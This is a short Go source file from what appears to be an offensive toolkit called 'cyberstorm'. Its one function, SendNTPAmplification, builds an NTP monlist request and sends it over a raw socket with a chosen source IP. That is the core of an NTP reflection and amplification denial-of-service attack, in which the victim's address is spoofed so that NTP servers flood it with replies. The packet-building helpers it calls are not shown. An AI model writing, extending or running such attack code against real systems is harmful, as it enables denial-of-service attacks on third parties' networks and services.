package attacks

import (
	"net"

	"cyberstorm/core"
)

func SendNTPAmplification(rawSocket core.RawSocket, srcIp, dstIp net.IP, dstPort uint16) error {
	// Build the NTP monlist request
	ntpRequest, err := core.BuildNTPMonlistRequest()
	if err != nil {
		return err
	}

	// Send the NTP monlist request via raw socket
	return core.SendNTPMonlist(rawSocket, srcIp, dstIp, ntpRequest)
}
